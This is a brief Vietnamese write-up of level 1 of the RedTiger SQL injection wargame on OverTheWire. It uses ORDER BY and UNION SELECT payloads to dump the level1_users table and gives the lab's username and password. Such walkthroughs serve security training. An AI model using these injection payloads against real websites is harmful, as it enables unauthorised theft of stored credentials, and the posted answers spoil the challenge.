#Writeup Redtiger Level1
*Người thực hiện: Hoàng Quốc Cường*
- Đầu tiên, ta cần tìm url có `php?id=`. Ta bấm vào số 1 bên cạnh Category thì chuyển qua url như sau: `http://redtiger.labs.overthewire.org/level1.php?cat=1`
<img src="http://i.imgur.com/JCsAkIu.png">
- Sau đó ta tiến hành `ORDER BY` để tìm xem có bao nhiêu cột. 
- Dùng lệnh `UNION SELECT 1,2,3,4-- -` để truy xuất các cột.
<img src="http://i.imgur.com/3F9wa35.png">
- Ở đây, đề bài đã cho ta biết table_name là **level1_users** nên ta có thể phỏng đoán rằng username và password ở trong bảng đó.
- Dùng lệnh `UNION SELECT 1,2,username,password FROM level1_users` thì sẽ thu được kết quả.
<img src="http://i.imgur.com/tR2L3F3.png">
- Kết quả: Username: **Hornoxe** và Password:**thatwaseasy**